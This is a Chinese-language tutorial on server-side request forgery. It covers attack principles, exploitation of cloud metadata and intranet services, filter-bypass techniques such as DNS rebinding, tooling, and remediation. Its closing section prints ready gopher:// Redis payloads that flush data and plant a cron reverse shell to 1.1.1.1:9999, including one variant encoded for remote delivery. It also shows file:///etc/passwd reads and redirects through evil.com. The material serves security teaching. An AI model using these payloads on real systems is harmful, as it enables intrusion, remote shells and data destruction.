### 简介

SSRF(Server Side Request Forgery)

任何能够直接或间接地使server发起网络请求的功能，如果该功能的参数是用户可控的，且对用户输入没有做严格的输入验证，就很有可能存在SSRF.

### 原理

"隔山打牛"

```
Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> Server2
     /\                           |        /\                         \/ 
     |                           \/         |                         | 
     '-----<----【4】resp----<----'         '---<----【3】resp----<----' 
```

```
流量走向                      流程说明
attacker -> SSRFserver      【1】攻击者发送Requset1到存在SSRF漏洞的Server.  req1:https://x.com/?url=http://<internal_hostname>:<port>/
SSRFserver -> internalServer【2】SSRFserver为"跳板" 发出Requset2.          req2:http://<internal_hostname>:<port>/
internalServer -> SSRFserver【3】SSRFserver得到req2的真实响应内容.
SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内容返回给攻击者则为Basic SSRF，否则为Blind SSRF.
```


* 第一个请求 通常是HTTP协议
* 第二个请求 由应用程序本身功能决定 理论上可以有各种protocol/scheme
  * `file://` `http://example.com/ssrf.php?url=file:///etc/passwd`
  * SSH `scp://` `sftp://`
  * `dict://` `http://example.com/ssrf.php?dict://evil.com:1337/`
  * `ldap://` LDAP(Lightweight Directory Access Protocol,轻量级目录访问协议)
    * `http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit`
    * `http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit`
    * `http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit`
  * `gopher://`
    * 重要作用:几乎可与任意**TCP** service交互
      * (1)指定`ip` `port` `bytes`
      * (2)you can exploit a SSRF to communicate with any TCP service.(but you need to know how to talk to the service first.)
    * 利用过程 `http://example.com/ssrf.php?url=http://evil.com/gopher.php` 重定向到 `gopher://yourlink.tld`. [详细过程](#ssrf利用过程---gopher协议结合跳转)
  * `tftp://` TFTP（Trivial File Transfer Protocol,简单文件传输协议) works over UDP
    * 重要作用:几乎可构造并发送任意的**UDP** packets
    * 利用过程

```
Request:
https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET

evil.com:# nc -v -u -l 12346
Listening on [0.0.0.0] (family 0, port 12346)
TESTUDPPACKEToctettsize0blksize512timeout6
```

### 漏洞分类

* 攻击者角度 按漏洞利用效果分类
  * Basic SSRF - **可回显**
    * 描述 : 攻击者可见【3】resp Body, 它通常与【4】resp Body完全相同
      * to内网 - 攻击者可利用"SSRFserver"访问内网主机 (如同一内网的`oa.intranet.apple-inc.com`) 并在"SSRFserver"域下看到内网的`oa.intranet.apple-inc.com`的响应内容(如 oa登录页面)
      * to公网 - 攻击者可利用"SSRFserver"访问公网主机 (如攻击者的`evil.com`) 并在"SSRFserver"域下看到`evil.com`的响应内容(如 XSSpayload)
  * Blind SSRF - **不可回显**
    * 描述 : 攻击者看不到【3】resp Body. 攻击者只能用**间接**方式 观察 判断
      * HTTP response status - HTTP响应的状态码(200 500)
      * HTTP response time - 时间间隔的长短(得到HTTP响应时间点-发起HTTP请求的时间点)


* **可回显的SSRF漏洞 (几乎等于突破内网边界)**
  * [漏洞分析 - Kong未授权访问漏洞(CVE-2020-11710) - 先知社区](https://xz.aliyun.com/t/7631)
  * ...

----------------

* 开发者角度的SSRF漏洞 - 按web应用的功能分类
  * 类型1 http请求中有参数值"URL地址" 开发者没做好严格的输入验证 server直接访问"URL地址" 触发SSRF
    * 代理服务 - online web proxy等
    * 资源下载 - 图片.png、图标.ico、网页.html、文本.txt 等
    * url跳转 - 如果支持了URL Schema(file等协议) 可读取本机文件 `http://x.com/click.jsp?url=http://127.0.0.1:8082/config/dbconfig.xml`
    * ...
  * 类型2 用户上传文件(常见文件类型 `SVG` `JPG` `XML` `JSON`)  web应用 对该文件进行 解析、处理、渲染 过程中触发SSRF
    * 处理网页文件 - 如html to pdf
      * 读取本地文件 - 如果web后端调用了headlessChrome等程序或第三方库 并在`file://`打开了html文件 则可在该html文件中创建`iframe`读取`file://`域下的内容 即本地文件)
      * SSRF
        * 利用`iframe`标签 - 实现SSRF
        * 利用`XMLHttpRequest`构造JavaScript代码 - 实现SSRF(在现代浏览器下有限制:需符合CORS)
        * 利用`img`标签 - 实现SSRF(不可回显)
        * ...
    * 处理图片文件
      * ImageMagick CVE-2016-3718
      * [PhantomJS Image Rendering](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
      * ...
    * 处理视频音频文件
      * Ffmpeg文件读取漏洞 CVE-2016-1897  CVE-2016-1898
        * [新浪微盘存在Ffmpeg文件读取漏洞-SSRF](https://www.secpulse.com/archives/49510.html)
        * [FFmpeg任意文件读取漏洞分析](https://zhuanlan.zhihu.com/p/28255225)


### 漏洞利用

通过"存在SSRF漏洞的服务器"(SSRFserver)与"目标主机"交互,目标主机的网络位置可在内网/公网:

* to公网 - 可通过"SSRFserver"与公网主机交互
  * 利用SSRF实现XSS - 攻击者可利用"SSRFserver"访问公网的`evil.com/xss.svg` 可在"SSRFserver"的域名下看到`evil.com`的Response Body(如 XSSpayload)
  * 利用SSRF实现钓鱼
  * ...
* to内网 - 可通过"SSRFserver"与内网主机交互 对"SSRFserver"所在内网的其他可达的服务器进行探测或渗透
  * 探测内网(Probe intranet)
    * 不可回显的SSRF漏洞 根据Response间接判断:（常用判断依据：HTTP响应码、HTTP响应时长）
      * IP - 探测内网网络架构 存活主机
      * service/port - 端口开放情况 如数据库类的服务
    * **"可回显的"**SSRF漏洞 根据Response Body**"直接"**判断:
      * 【危害1】内网资产搜集
        * "指纹识别" - 根据SSRF回显的Response可得到web前端代码进行"指纹识别" 以搜集内网资产(web应用等) 可能有助于横向移动
          * 比如 tomcat的一个指纹是 [tomcat.png](https://github.com/apache/tomcat/tree/master/webapps/ROOT)
          * ...
      * 【危害2】渗透内网 - 参考[内网常见漏洞exploit](#内网常见漏洞exploit)
      * 【危害3】通过SSRF漏洞获取实例的"元数据" (该方法只适用于云环境下的Cloud Instances)
        * 说明:如果具有SSRF漏洞的Web应用运行在云环境中某个实例(OS)上，则可通过SSRF漏洞实现用该实例的IP，去访问云服务商提供的"让内部主机查询自身元数据的服务" 来获取该实例的"元数据". 不同的云服务商都有这个风险.
          * AWS(Amazon Web Services) - 利用AWS的"实例元数据服务"(Instance Metadata service,IMS) 即可获取该云实例的"元数据"(Aws keys, ssh keys and [more](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)) 
          * Alibaba Cloud - [获取实例元数据 - 实例| 阿里云](https://www.alibabacloud.com/help/zh/doc-detail/108460.htm)
          * Microsoft Azure [Instance Metadata Service](https://azure.microsoft.com/en-us/blog/announcing-general-availability-of-azure-instance-metadata-service/)
          * Google Cloud Engine
          * Digital Ocean - all data `http://169.254.169.254/metadata/v1.json`
          * ...



#### 内网常见漏洞exploit

  * 获取主机权限 或 挖掘其他漏洞(可作为[RCE Chain](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)中的一环)
    * web - Tomcat Manager 暴力枚举 [需回显Response body]
    * web - Confluence Unauthorized RCE(CVE-2019-3396)
    * web - Jenkins本身 🔥pre-auth RCE  (CVE-2018-1000861 CVE-2019-1003005 CVE-2019-1003029 ) [orangetw/awesome-jenkins-rce-2019](https://github.com/orangetw/awesome-jenkins-rce-2019)
    * web - Jenkins插件 RCE CVE-2019-1003000  CVE-2019-1003001  CVE-2019-1003002)
    * web - Jenkins弱口令 [需回显Response body]
      * 登录后 使用"脚本命令行执行"即`http://jenkins.some-inc.com:8080/script`执行Groovy script 如`println "whoami".execute().text`
    * web - Github Enterprise RCE < 2.8.7
    * web - SQLi等 [需回显Response body]
    * web - Struts2 RCE
    * web - PHP FastCGI RCE
      * 利用条件 端口9000可访问 且未配置身份认证
      * 工具命令 `gopherus --exploit fastcgi`
    * Redis未授权/弱口令导致RCE
      * 利用条件 redis以root权限启动 端口6379可未授权访问 可执行任意redis命令
      * 利用方式1 反弹系统shell - 执行redis命令`flushall` 然后写字符串:定时任务crontab(执行bash脚本)内容 保存到`/var/spool/cron/`
      * 利用方式2 get webshell - 执行redis命令`flushall` 然后写字符串:webshell内容 保存到web目录 `/需指定具体目录`
      * 工具命令 `gopherus --exploit redis`
    * MongoDB未授权/弱口令可获取数据
    * MySQL未授权 RCE
      * 利用条件 MySQL Server某账号为空口令 则可[构造Gopher链接](https://spyclub.tech/2018/02/05/2018-02-05-ssrf-through-gopher/) 发送tcp数据到MySQL端口 以执行任意SQL语句
      * 利用方式1 get webshell - 执行SQL语句 写webshell文件 保存到web目录 `/需指定具体目录`
      * 利用方式2 获取数据 - 构造SQL语句发出带外请求
      * 工具命令 `gopherus --exploit mysql`
    * Memcached 未授权/弱口令可获取数据 可RCE 默认端口11211
      * Python-Pickle De-serialization `gopherus --exploit pymemcache`
      * PHP De-serialization `gopherus --exploit phpmemcache`
      * Ruby-Marshal De-serialization `gopherus --exploit rbmemcache`
      * dumping Memcached content `gopherus --exploit dmpmemcache`
    * Zabbix 默认端口10050
      * 利用条件 Zabbix服务器开放了10050端口并配置了`EnableRemoteCommands = 1` 则可执行shell命令
      * 工具命令 `gopherus --exploit zabbix` 
    * SMTP  默认端口25
      * 利用方式 利用开放的SMTP端口发送邮件
      * 工具命令 `gopherus --exploit smtp` 指定4个参数:`From Mail` `To Mail` `Subject` `Text`
    * ...

工具[Gopherus](https://github.com/tarunkant/Gopherus)可以生成`gopher://`链接 以便利用已知的SSRF漏洞. 构造`gopher://`链接 发送tcp数据 攻击内网.


### 绕过技巧

* webserver层面 - 利用server特性进行绕过
  * "请求夹带"(Request Smuggling) - 使用格式不正确的HTTP headers或利用Web服务器的特定"解析"(parsing)行为，将来自攻击者的请求注入到另一个请求的开头
  * "请求分割"(Request Splitting) - 使用特定的Unicode字符，利用HTTP基于文本的特性，以在请求中使用"协议控制字符"(protocol control indicators)来分割行，以实现能够传递SSRF payload的注入。具体参考[Security Bugs in Practice: SSRF via Request Splitting](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)


* web应用层面 - 绕过不严谨的"域名校验编程实现"
  * 使用@ `a.com@10.10.10.10` `a.com:b@10.10.10.10`
  * IP地址的不同形式 - 进制转换
    * 十进制形式 `127.0.0.1 <-> 2130706433` 计算方法`(127)*256^3+(0)*256^2+(0)*256^1+(1)*256^0=2130706433`  `(21)*256^1+(200)=5576` 如bing的外网IP转换为十进制形式 `13.107.21.200 <-> 13.107.5576 <-> 13.7017928 <-> 225121736`
    * 十六进制形式 `13.107.21.200 <-> 0xD6B15C8`
    * 混合各形式 如八进制.十进制 `13.107.21.200 <-> 015.7017928`
  * 自定义域名解析
    * 利用 [xip.name](https://github.com/peterhellberg/xip.name) 类似的还有 nip.io xip.io
      * `127.0.0.1 <-> http://2130706433.xip.name`支持十进制. 支持任意前缀`ping qq.com.127.0.0.1.xip.name`
      * `10.100.21.7 <-> http://10.100.21.7.xip.io` `https://182.61.200.6.xip.io` SSL证书会"无效"
      * `127.0.0.1 <-> http://www.apple.com.anything.127.0.0.1.nip.io` 绕过不严谨的判断
      * `169.254.169.254 <-> 1ynrnhl.xip.io` 云场景 (IPv4 Link Local Address)
    * 利用 https://sslip.io 支持ssl 支持ipv6
      * https://52-0-56-137.sslip.io/
  * DNS重绑定(DNS Rebinding) **重点** 攻击步骤
    * 搭建ns服务器 - 搭建ns服务器`ns1.evil.com` 对域名`a.evil.com`的解析都由`ns1.evil.com`完成.
    * 设置缓存时间 - 设置一条NS记录 使`a.evil.com`的缓存时间为0 即`TTL=0`. 所以每次访问`a.evil.com`都需要向`ns1.evil.com`发起DNS查询得到它最新的A记录
    * 攻击者发出HTTP请求 提交参数值`a.evil.com`到目标站点的后端
    * 后端验证:后端逻辑对`a.evil.com`进行"第1次域名解析" 得到了合法的外网IP 并判断发现不是内网IP 则anti-SSRF验证通过 继续向下执行
    * 攻击者修改域名解析:经过"第1次域名解析"后 利用短暂的时间差 快速修改ns服务器`ns1.evil.com`上的A记录为内网IP`10.10.2.2`
    * 后端执行:后端的程序逻辑继续使用刚才得到的参数值`a.evil.com`(由于`ns1.evil.com`对`a.evil.com`设置的A记录缓存时间`TTL=0` 所以后端对`a.evil.com`做了"第2次域名解析" 此时得到了内网IP`10.10.2.2`)
    * 后端使用了解析得到的内网内网IP`10.10.2.2` SSRF攻击成功
  * 短网址跳转 - "短网址"响应(301 永久重定向)到内网地址 `http://10.10.116.11 => http://t.cn/RwbLKDx`
  * JavaScript跳转


SSRF自动化工具 用于发现漏洞、生成payload等

|名称|属性|描述|
|:-------------:|--|-----|
|[swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)|python3|Automatic SSRF fuzzer and exploitation(RCE漏洞利用) tool|
|[cujanovic/SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)|python|生成不同形式的SSRF payload (IP obfuscator ...)|
|[D4Vinci/Cuteit(IP obfuscator)](https://github.com/D4Vinci/Cuteit)|python2|IP obfuscator 将恶意IP改为各种格式以绕过安全检测|
|[tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)|python2|生成gopher link 以利用SSRF漏洞 对其他服务器的RCE漏洞进行利用 |

### 修复方案

* 根据应用程序的设计需求和功能 需要对非本机发出请求的场景 通常分为2种情况
  * 情况1:只需要向"指定"主机(域名/IP)发送请求
    * 修复方案:设置 主机(域名/IP)白名单列表，只允许web应用访问白名单列表中的主机
  * 情况2:需要向"任意"主机(域名/IP)发送请求 无法设置 主机(域名/IP)白名单列表
    * 设置协议白名单 - 仅允许必要的协议 如`http`和`https` 避免攻击者使用其他协议(如 `file://`，`phar://`，`gopher://`，`data://`，`dict://`等) 
    * 输入验证(Input validation)
      * 严格限制参数值的内容 - 参数值内容 视业务而定(如果参数值为IP/域名 可使用编程语言的标准库验证是否为有效的IP/域名)
      * 严格限制参数值的长度 - 字符串的最大长度 视业务而定
      * 字符黑名单检测 - 根据应用程序的实际需求，如果按实际需求参数值中不会有特殊字符，则添加检测逻辑：如果有非预期的非法字符(如 `#` `@` `?` 等)  则`return false` 拒绝向下执行
    * 禁止重定向(Redirect)
      * 301 redirect 永久性转移(Permanently Moved)
      * 302 redirect 暂时性转移(Temporarily Moved)
    * ...

参考 https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md

-----

### SSRF利用过程 - gopher协议结合跳转

前提：存在SSRF漏洞的web后端所用的函数支持gopher协议.

攻击者构造http请求中如`gopher://`的payload，发送给web后端，在其服务器上解析gopher协议并向内网IP(或任何网络可达的主机)的任意的port发送TCP协议的数据.

攻击者公网主机ReciveData.com上 监听1337端口:
```
evil.com:# nc -lvp 1337
```

攻击者公网服务器 `evil.com/gopher.php`的内容:
```
<?php
  header('Location: gopher://ReciveData.com:1337/_Hi%0Assrf');
?>
```

攻击者构造HTTP请求发向"存在SSRF漏洞的web服务器",使该服务器发出HTTP请求到 `http://evil.com/gopher.php`, 该服务器得到HTTP Response是一个301/302跳转,如果该服务器跟随了跳转,向`gopher`链接发出请求,则该服务器对指定IP的指定port发送TCP协议的指定数据,实现SSRF

攻击者公网主机(ReciveData.com的TCP port 1337) 收到了"存在SSRF漏洞的web服务器"发来的数据:
```
Hi
ssrf
```

[SSRF Tips](http://blog.safebuff.com/2016/07/03/SSRF-Tips/) `SSRF PHP function` `SFTP Dict gopher TFTP file ldap`


### cURL支持的协议

cURL支持的协议很多
```
$ curl -V
curl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl/7.47.1 OpenSSL/1.0.2g zlib/1.2.8  
Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp  
Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets
```

```
# dict protocol (操作Redis)
# 本地测试
curl -vvv 'dict://127.0.0.1:6379/info'
```

```
# file protocol (任意文件读取)
# 本地测试
curl -vvv 'file:///etc/passwd'
```

```
# gopher protocol (利用redis写入var/spool/cron实现反弹Bash)  注意:会清空redis的数据!
# 本地测试 方式1
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/1.1.1.1/9999 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'

# 本地测试 方式2
curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/1.1.1.1/9999 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'

# 远程测试 方式3
curl -v 'http://xxx.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F1.1.1.1%2F9999%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'
```
